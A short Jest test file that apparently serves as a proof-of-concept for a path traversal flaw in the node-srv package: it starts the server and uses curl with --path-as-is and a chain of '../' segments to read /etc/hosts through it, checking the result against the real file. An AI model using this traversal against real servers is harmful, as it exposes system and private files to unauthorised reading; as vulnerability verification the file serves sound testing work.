function genstr(n)
{
    let a ='./node_modules/';
    for(i=0;i<n;i++)
     {
        a = a + '/..';
     }
     return a;
}

test("Path Traversal in node-srv",() => {
    var Server = require('node-srv');
    const fs = require('fs');
    const sleep = require('sleep');
    const path = './file2';
    const { exec } = require("child_process");

    var srv = new Server({
        port: 8080,
        root: './',
        logs: true
    }, function () {
        //console.log('Server stopped');
    });
    //const path_etc_hosts = genstr() +'/Setc/hosts';

    let read_data = "";
    read_data = fs.readFileSync('./node_modules/../../../../../../../etc/hosts', 'utf8' , (err, data) => { })
    fs.writeFileSync('./file1', read_data, err => {})

    sleep.sleep(5);

    exec("curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../../../etc/hosts", (error, stdout, stderr) => {

    let res = '';//(stdout === read_data)
    expect(stdout === read_data).toBe(true);
    });

});